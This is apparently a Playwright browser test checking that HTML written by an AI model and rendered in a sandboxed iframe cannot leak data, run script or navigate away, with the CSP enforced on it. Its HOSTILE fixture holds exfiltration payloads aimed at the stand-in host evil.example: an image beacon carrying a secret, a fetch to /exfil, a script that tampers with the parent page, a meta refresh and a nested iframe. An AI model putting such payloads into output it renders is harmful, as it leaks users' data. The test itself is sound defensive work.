// frame-policy.mjs — real-browser verification that model-authored HTML shown
// by render_html cannot phone home, script, or touch the tile.
//
// This exists because the claim it checks is not self-evident and is easy to
// regress: sandbox="" stops scripts, forms and navigation but does NOT stop
// subresource LOADS, and the xbin platform CSP on /c/ documents carries no
// img-src / connect-src at all. The only thing standing between a model's
// <img src="https://…/?leak=…"> and a real outbound request is the meta CSP
// that frameDoc() prepends. A unit test asserting "the string contains
// default-src 'none'" would prove nothing; this drives an actual Chromium and
// watches the network.
//
//   node test/frame-policy.mjs          (needs playwright + a chromium build)
//
// Skips cleanly when playwright is unavailable, so it never blocks a machine
// that only builds the Go backend.
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

const here = dirname(fileURLToPath(import.meta.url));

let chromium;
try {
  ({ chromium } = await import('/usr/local/node/lib/node_modules/playwright/index.mjs'));
} catch {
  try { ({ chromium } = await import('playwright')); } catch {
    console.log('SKIP: playwright not installed (npm i -g playwright && playwright install chromium)');
    process.exit(0);
  }
}

// frameDoc lives in agent.js, which imports from /vendor and so cannot be
// imported by node directly. Slice it out between two stable markers and fail
// loudly if either moves, rather than silently testing nothing.
const agentSrc = readFileSync(join(here, '..', 'agent.js'), 'utf8');
const start = agentSrc.indexOf('const FRAME_CSP');
const end = agentSrc.indexOf('let preview = null;');
if (start < 0 || end < 0 || end <= start) {
  console.error('FAIL: could not locate frameDoc() in agent.js — update the markers in this test');
  process.exit(1);
}
const frameDocSrc = agentSrc.slice(start, end);
// The native view's render preview (native/render-doc.js) must hold the same
// line: the same CSP, and the same results in the same browser — through
// DOMParser as the runtime document has it, and through the textual
// fallback (no DOMParser).
const nativeSrc = readFileSync(join(here, '..', 'native', 'render-doc.js'), 'utf8').replace(/^export /gm, '')
  .replace(/const FRAME_CSP/, 'const NATIVE_CSP').replace(/const FRAME_CSS/, 'const NATIVE_CSS')
  .replace(/\bFRAME_CSP\b(?!\s*=)/g, 'NATIVE_CSP').replace(/\bFRAME_CSS\b(?!\s*=)/g, 'NATIVE_CSS');

let failures = 0;
const ok = (name, cond, extra = '') => {
  console.log(`${cond ? 'PASS' : 'FAIL'}  ${name}${cond ? '' : '  ← ' + extra}`);
  if (!cond) failures++;
};

const browser = await chromium.launch();
const ctx = await browser.newContext();

// Anything reaching for the outside world is recorded, then aborted.
const escaped = [];
await ctx.route('**/*', (route) => {
  const u = route.request().url();
  if (u.includes('evil.example') || u.includes('beacon')) {
    escaped.push(u);
    return route.abort();
  }
  return route.continue();
});

const page = await ctx.newPage();
await page.goto('about:blank');
await page.addScriptTag({ content: frameDocSrc });
await page.addScriptTag({ content: nativeSrc });

// Every exfiltration channel that survives sandbox="" on its own, plus the
// ordinary content a real report would contain.
const HOSTILE = `<!doctype html><html><head>
  <title>report</title>
  <meta http-equiv="refresh" content="0;url=https://evil.example/x">
  <link rel="stylesheet" href="https://evil.example/s.css">
  <style>h1{color:teal}</style>
</head><body>
  <h1>Q3 numbers</h1>
  <svg width="40" height="10"><rect width="40" height="10" fill="teal"/></svg>
  <img src="https://evil.example/beacon.png?d=SECRET">
  <a href="https://evil.example/y" target="_self">click me</a>
  <a href="#section">in-page</a>
  <script>window.parent.document.title = 'PWNED'; fetch('https://evil.example/exfil')</script>
  <iframe src="https://evil.example/nested"></iframe>
</body></html>`;

const res = await page.evaluate((h) => frameDoc(h), HOSTILE);
ok('the native preview has the same CSP', await page.evaluate(() => FRAME_CSP === NATIVE_CSP));
const nat = await page.evaluate((h) => renderDoc(h), HOSTILE);
ok('native (DOMParser): the same document as the web', nat.html === res.html && nat.blocked === res.blocked, nat.html.slice(0, 200));
const txt = await page.evaluate((h) => textual(h), HOSTILE);
ok('native (textual): our CSP is first', txt.html.startsWith('<!doctype html><html><head><meta http-equiv="Content-Security-Policy"'), txt.html.slice(0, 200));
ok('native (textual): meta refresh neutralised', !/http-equiv="refresh"/i.test(txt.html));
ok('native (textual): blocked resources counted', txt.blocked >= 3, `blocked=${txt.blocked}`);

// --- the produced document ----------------------------------------------
ok('meta refresh stripped', !/http-equiv="refresh"/i.test(res.html));
ok('off-page href stripped', !res.html.includes('evil.example/y'));
ok('target attribute stripped', !/target="_self"/i.test(res.html));
ok('in-page anchor kept', res.html.includes('href="#section"'));
ok('our CSP is first in head', /<head>\s*<meta http-equiv="Content-Security-Policy"/i.test(res.html),
   res.html.slice(0, 200));
ok('CSP denies everything by default', res.html.includes("default-src 'none'"));
ok('doctype emitted first', res.html.startsWith('<!doctype html>'));
ok('model content preserved', res.html.includes('Q3 numbers') && res.html.includes('<svg'));
ok('model inline style preserved', res.html.includes('color:teal'));
ok('blocked resources counted for the human', res.blocked >= 3, `blocked=${res.blocked}`);

// --- live behaviour in a frame configured exactly like index.html --------
const beforeTitle = await page.title();
for (const doc of [res.html, txt.html]) { // the web's, and the native fallback's
  await page.evaluate((html) => {
    const f = document.createElement('iframe');
    f.setAttribute('sandbox', '');
    f.setAttribute('referrerpolicy', 'no-referrer');
    f.style.cssText = 'width:600px;height:400px';
    f.srcdoc = html;              // PROPERTY assignment, as paintPreview does
    document.body.appendChild(f);
  }, doc);
}
await page.waitForTimeout(1500);

ok('no request escaped the frame', escaped.length === 0, JSON.stringify(escaped));
ok('parent DOM untouched by frame script', (await page.title()) === beforeTitle);

const frames = page.frames().filter((f) => f.parentFrame() === page.mainFrame());
ok('frames rendered', frames.length === 2);
for (const frame of frames) {
  const seen = await frame.evaluate(() => ({
    h1: document.querySelector('h1')?.textContent || '',
    origin: String(location.origin),
    imgWidths: [...document.images].map((i) => i.naturalWidth),
  }));
  ok('content is visible to the user', seen.h1 === 'Q3 numbers', JSON.stringify(seen));
  ok('frame is an opaque origin', seen.origin === 'null', seen.origin);
  ok('no image actually loaded', seen.imgWidths.every((w) => w === 0), JSON.stringify(seen.imgWidths));
}

await browser.close();
console.log(failures ? `\n${failures} FAILURE(S)` : '\nall frame-policy checks passed');
process.exit(failures ? 1 : 0);
